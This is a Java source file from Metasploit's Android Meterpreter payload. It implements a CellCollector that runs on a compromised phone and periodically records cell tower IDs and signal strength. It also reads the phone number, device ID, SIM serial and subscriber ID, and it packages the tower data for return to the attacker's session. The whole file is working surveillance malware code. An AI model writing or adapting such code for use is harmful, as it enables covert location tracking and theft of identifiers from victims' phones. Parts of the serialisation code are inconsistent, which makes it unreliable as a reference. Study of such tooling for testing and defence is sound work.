package com.metasploit.meterpreter;

import android.os.Bundle;
import android.telephony.CellLocation;
import android.telephony.NeighboringCellInfo;
import android.telephony.PhoneStateListener;
import android.telephony.ServiceState;
import android.telephony.TelephonyManager;
import android.telephony.cdma.CdmaCellLocation;
import android.telephony.gsm.GsmCellLocation;
import android.telephony.CellInfoGsm;
import android.telephony.CellInfoCdma;
import android.telephony.CellInfoWcdma;
import android.telephony.CellInfoLte;
import android.telephony.CellSignalStrengthGsm;
import android.telephony.CellSignalStrengthCdma;
import android.telephony.CellSignalStrengthLte;
import android.telephony.CellSignalStrengthWcdma;
import android.telephony.CellSignalStrength;
import android.util.Log;

import android.content.Context;
import java.util.ArrayList;
import java.util.Collections;
import java.util.List;
import java.util.Hashtable;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;

import java.lang.InterruptedException;
import java.lang.Math;
import java.lang.ClassCastException;

import com.metasploit.meterpreter.MeterpreterLogger;

//
import com.metasploit.meterpreter.android.interval_collect;


public class CellCollector extends IntervalCollector {

	public final static int INVALID_LAT_LONG = Integer.MAX_VALUE;
    private final Object syncObject = new Object();
    private Hashtable<Long, TelephonyModel> collections = null;
	TelephonyModel mTelePhonybj = new TelephonyModel();
	public MeterpreterLogger mMeterpreterLogger =  new MeterpreterLogger();

    public CellCollector(int collectorId, Context context, long timeout) {
        super(collectorId, context, timeout);
        mMeterpreterLogger.enableLoging();
        this.collections = new Hashtable<Long, TelephonyModel>();
    }

    public CellCollector(int collectorId, Context context) {
        super(collectorId, context);
        mMeterpreterLogger.enableLoging();
        this.collections = new Hashtable<Long, TelephonyModel>();
    }

    protected void init() {
    }

    protected void deinit() {
    }

    protected boolean collect(DataOutputStream output) throws IOException {
		TelephonyModel lTelePhonybj = new TelephonyModel();
		lTelePhonybj.setmUnixEpoch();
    	getTelephonyInfo(lTelePhonybj);

        if (lTelePhonybj != null) {

            synchronized (this.syncObject) {
                this.collections.put(System.currentTimeMillis(), lTelePhonybj);

                // collect requires the result to be the serialised version of
                // the collection data so that it can be written to disk
                output.writeLong(this.timeout);
                output.writeInt(this.collections.size());
                for (Long ts : this.collections.keySet()) {
										TelephonyModel lObj;
                    lObj = this.collections.get(ts.longValue());
                    output.writeLong(ts.longValue());
                    //output.writeInt(results.size());
                    lObj.write(output);
                }
            }
            return true;
        }
        return false;
    }

	protected void loadFromMemory(DataInputStream input) throws IOException {
		this.timeout = input.readLong();
		int collectionCount = input.readInt();
		for (int i = 0; i < collectionCount; ++i) {
			long ts = input.readLong();
			int resultCount = input.readInt();

			for (int j = 0; j < resultCount; ++j) {

				TelephonyModel lTelephonyModObj  = new   TelephonyModel();
				lTelephonyModObj.mUnixEpoch = input.readLong();
	       		lTelephonyModObj.mCellTowerId= input.readUTF();
	        	lTelephonyModObj.mSignalStrength= input.readUTF();
				// lTelephonyModObj.mDeviceid = input.readUTF();
				// lTelephonyModObj.mPhonenumber = input.readUTF();
				// lTelephonyModObj.mSoftwareversion = input.readUTF();
				// lTelephonyModObj.mNetWorkOperatorName = input.readUTF();
				// lTelephonyModObj.mSimCountryCode = input.readUTF();
				// lTelephonyModObj.mNetWorkOperator = input.readUTF();
				// lTelephonyModObj.mSimSerialNumber = input.readUTF();
				// lTelephonyModObj.mSubscriberId = input.readUTF();
				// lTelephonyModObj.mNetWorkType = input.readUTF();
				// lTelephonyModObj.mPhoneType = input.readUTF();

				// lTelephonyModObj.mGSMCellInfo.mCid = input.readInt();
				// lTelephonyModObj.mGSMCellInfo.mLac = input.readInt();
				// lTelephonyModObj.mGSMCellInfo.mPsc = input.readInt();

				// lTelephonyModObj.mCDMACellInfo.mBaseStationId  = input.readInt();
				// lTelephonyModObj.mCDMACellInfo.mBaseStationLatitude  = input.readInt();
				// lTelephonyModObj.mCDMACellInfo.mBaseStationLongitude  = input.readInt();
				// lTelephonyModObj.mCDMACellInfo.mSystemId  = input.readInt();
				// lTelephonyModObj.mCDMACellInfo.mNetworkId  = input.readInt();

				this.collections.put(ts, lTelephonyModObj);
			}
		}
	}

    public boolean flush(TLVPacket packet) {
        Hashtable<Long, TelephonyModel> collections = this.collections;

        synchronized (this.syncObject) {
            // create a new collection, for use on the other thread
            // if it's running
            this.collections = new Hashtable<Long, TelephonyModel>();
        }

        List<Long> sortedKeys = new ArrayList<Long>(collections.keySet());
        Collections.sort(sortedKeys);

        for (Long ts : sortedKeys) {
            long timestamp = ts.longValue();
            TelephonyModel telePhonyscanResults = collections.get(timestamp);
            TLVPacket resultSet = new TLVPacket();

            try {
                resultSet.add(interval_collect.TLV_TYPE_COLLECT_RESULT_TIMESTAMP, timestamp / 1000);
            }
            catch (IOException ex) {
                // not good, but not much we can do here
            }

            TelephonyModel result = telePhonyscanResults;
            TLVPacket telePhonySet = new TLVPacket();
            try {
            	//We need add the telephony related interval_collect types
                telePhonySet.add(interval_collect.TLV_TYPE_CELL_TOWERID, result.mCellTowerId);
                telePhonySet.add(interval_collect.TLV_TYPE_CELL_SINGALSTRENGTH, result.mSignalStrength);

                resultSet.addOverflow(interval_collect.TLV_TYPE_COLLECT_RESULT_WIFI, telePhonySet);
            }
            catch (IOException ex) {
                // not good, but not much we can do here
            }

            try {
              packet.addOverflow(interval_collect.TLV_TYPE_COLLECT_RESULT_GROUP, resultSet);
            }
            catch (IOException ex) {
                // not good, but not much we can do here
            }
        }

        return true;
    }


	private String getNetworkTypeString(int type) {
	
			String typeString = "Unknown";
	
			switch (type) {
	
				case TelephonyManager.NETWORK_TYPE_EDGE:
					typeString = "EDGE";
					break;
		
				case TelephonyManager.NETWORK_TYPE_GPRS:
					typeString = "GPRS";	
					break;
		
				case TelephonyManager.NETWORK_TYPE_UMTS:
					typeString = "UMTS";
					break;
		
				default:
					typeString = "UNKNOWN";
					break;	
			}
	
			return typeString;
	}
	
	
	
	private String getPhoneTypeString(int type) {

		String typeString = "Unknown";

		switch (type) {

			case TelephonyManager.PHONE_TYPE_GSM:	
				typeString = "GSM";
				break;
	
			case TelephonyManager.PHONE_TYPE_NONE:
				typeString = "UNKNOWN";
				break;
	
			default:
				typeString = "UNKNOWN";
				break;	
		}	
		return typeString;
	}


	public void getTelephonyInfo(TelephonyModel aTelephonyObj){
		
		TelephonyManager lTelePhonyManager = (TelephonyManager) AndroidMeterpreter.getContext()
				.getSystemService(Context.TELEPHONY_SERVICE);
		//(CellInfoGsm) cellinfogsm		(CellInfoGsm)TM.getAllCellInfo();
		List<CellInfoGsm> lGsmCellInfo;
		List<CellInfoCdma> lCDMACellInfo;

		GsmCellLocation gsmloc;
		CdmaCellLocation cdmaloc;


		if(lTelePhonyManager.getPhoneType() == TelephonyManager.PHONE_TYPE_CDMA ) {
			cdmaloc = (CdmaCellLocation) lTelePhonyManager.getCellLocation();
			lCDMACellInfo = (List<CellInfoCdma>)(Object)lTelePhonyManager.getAllCellInfo();
			aTelephonyObj.mCDMACellInfo.mBaseStationId  		= cdmaloc.getBaseStationId();
			aTelephonyObj.mCDMACellInfo.mBaseStationLatitude  	= cdmaloc.getBaseStationLatitude();
			aTelephonyObj.mCDMACellInfo.mBaseStationLongitude  	= cdmaloc.getBaseStationLongitude();
			aTelephonyObj.mCDMACellInfo.mSystemId  				= cdmaloc.getSystemId();
			aTelephonyObj.mCDMACellInfo.mNetworkId  			= cdmaloc.getNetworkId();
			CellSignalStrengthCdma lObj1 = (CellSignalStrengthCdma)lCDMACellInfo.get(0).getCellSignalStrength();
			aTelephonyObj.mSignalStrength 						= String.valueOf(lObj1.getDbm());
			//((CellSignalStrengthCdma)(((CellInfoCdma)lTelePhonyManager.getAllCellInfo()).getCellSignalStrength())).getDbm()

		}
		else if(lTelePhonyManager.getPhoneType() == TelephonyManager.PHONE_TYPE_GSM) {
			gsmloc = (GsmCellLocation) lTelePhonyManager.getCellLocation();
			lGsmCellInfo = (List<CellInfoGsm>)(Object)lTelePhonyManager.getAllCellInfo();

			aTelephonyObj.mGSMCellInfo.mCid = gsmloc.getCid();
			aTelephonyObj.mGSMCellInfo.mLac = gsmloc.getLac();
			aTelephonyObj.mGSMCellInfo.mPsc = gsmloc.getPsc();
			aTelephonyObj.mCellTowerId = String.valueOf(aTelephonyObj.mGSMCellInfo.mCid);
			//Object lObj2 = lGsmCellInfo.get(0).getCellSignalStrength();

			try{
				CellSignalStrengthGsm lObj2		= (CellSignalStrengthGsm)(((List<CellInfoGsm>)(Object)lTelePhonyManager.getAllCellInfo()).get(0).getCellSignalStrength());	
				if(lObj2 != null) {
					aTelephonyObj.mSignalStrength 	= String.valueOf(lObj2.getDbm());
					mMeterpreterLogger.d(" GSM Device "," --");		
				}	
			}
			catch (ClassCastException castException) {
				mMeterpreterLogger.d("Not a GSM Device "," --");			
				castException.printStackTrace();
			}

			try{
				//CellInfoLte
				CellSignalStrengthLte lObj2		= (CellSignalStrengthLte)(((List<CellInfoLte>)(Object)lTelePhonyManager.getAllCellInfo()).get(0).getCellSignalStrength());
				if(lObj2 != null) {
					aTelephonyObj.mSignalStrength 	= String.valueOf(lObj2.getDbm());
					mMeterpreterLogger.d(" LTE Device "," --");			
				}

			}
			catch (ClassCastException castException) {
				mMeterpreterLogger.d("Not a LTE Device "," --");			
				castException.printStackTrace();
			}

			try{
				//CellInfoWcdma
				CellSignalStrengthWcdma lObj2		= (CellSignalStrengthWcdma)(((List<CellInfoWcdma>)(Object)lTelePhonyManager.getAllCellInfo()).get(0).getCellSignalStrength());
				if(lObj2 != null) {
					aTelephonyObj.mSignalStrength 	= String.valueOf(lObj2.getDbm());
					mMeterpreterLogger.d( " WCDMA Device "," --");			
				}

			}
			catch (ClassCastException castException) {
				mMeterpreterLogger.d("Not a WCDMA Device "," --");			
				castException.printStackTrace();				
			}

		}

		aTelephonyObj.mDeviceid 			= lTelePhonyManager.getDeviceId();
		aTelephonyObj.mPhonenumber 			= lTelePhonyManager.getLine1Number();
		aTelephonyObj.mSoftwareversion 		= lTelePhonyManager.getDeviceSoftwareVersion();
		aTelephonyObj.mNetWorkOperatorName 	= lTelePhonyManager.getNetworkOperatorName();
		aTelephonyObj.mSimCountryCode 		= lTelePhonyManager.getSimCountryIso();
		aTelephonyObj.mNetWorkOperator 		= lTelePhonyManager.getSimOperatorName();
		aTelephonyObj.mSimSerialNumber 		= lTelePhonyManager.getSimSerialNumber();
		aTelephonyObj.mSubscriberId 		= lTelePhonyManager.getSubscriberId();
		aTelephonyObj.mNetWorkType 			= getNetworkTypeString(lTelePhonyManager.getNetworkType());
		aTelephonyObj.mPhoneType 			= getPhoneTypeString(lTelePhonyManager.getPhoneType());

	}




// Telephony Model
	private class TelephonyModel  {

		public long mUnixEpoch;
		public String mSignalStrength;
		public String mCellTowerId;
		public String mIMEINumber;
		public String mNetWorkOperator;
		public String mNetWorkOperatorName;
		public String mNetWorkType;
		public String mDeviceid ;
		public String mPhonenumber ;
		public String mSoftwareversion ;
		public String mSimCountryCode ;
		public String mSimSerialNumber ;
		public String mSubscriberId ;
		public String mPhoneType ;


		public GSMCellInfo mGSMCellInfo  = new GSMCellInfo();
		public CDMACellInfo mCDMACellInfo = new CDMACellInfo();

		public void setmUnixEpoch(){
				mUnixEpoch =  System.currentTimeMillis();
		}


	    public void write(DataOutputStream output) throws IOException {
			output.writeLong(this.mUnixEpoch);
	        output.writeChars(this.mSignalStrength);
	        output.writeChars(this.mCellTowerId);
	  //       output.writeChars(this.mIMEINumber);
	  //       output.writeChars(this.mNetWorkOperator);
	  //       output.writeChars(this.mNetWorkOperatorName);
	  //       output.writeChars(this.mNetWorkType);
	  //       output.writeChars(this.mDeviceid);
	  //       output.writeChars(this.mPhonenumber);
	  //       output.writeChars(this.mSoftwareversion);
	  //       output.writeChars(this.mSimCountryCode);
	  //       output.writeChars(this.mSimSerialNumber);
	  //       output.writeChars(this.mSubscriberId);
	  //       output.writeChars(this.mPhoneType);

			// output.writeInt(this.mGSMCellInfo.mLac);
			// output.writeInt(this.mGSMCellInfo.mCid);
			// output.writeInt(this.mGSMCellInfo.mPsc);

			// output.writeInt(this.mCDMACellInfo.mBaseStationId);
			// output.writeInt(this.mCDMACellInfo.mBaseStationLatitude);
			// output.writeInt(this.mCDMACellInfo.mBaseStationLongitude);
			// output.writeInt(this.mCDMACellInfo.mSystemId);
			// output.writeInt(this.mCDMACellInfo.mNetworkId);

	    }

	}

	private class GSMCellInfo {
		public int mLac  = -1;
	    public int mCid  = -1;
	    public int mPsc  = -1;

	}

	private class CDMACellInfo {
		public int mBaseStationId = -1;
		public int mBaseStationLatitude = INVALID_LAT_LONG;
		public int mBaseStationLongitude = INVALID_LAT_LONG;
		public int mSystemId = -1;
    	public int mNetworkId = -1;

	}

}

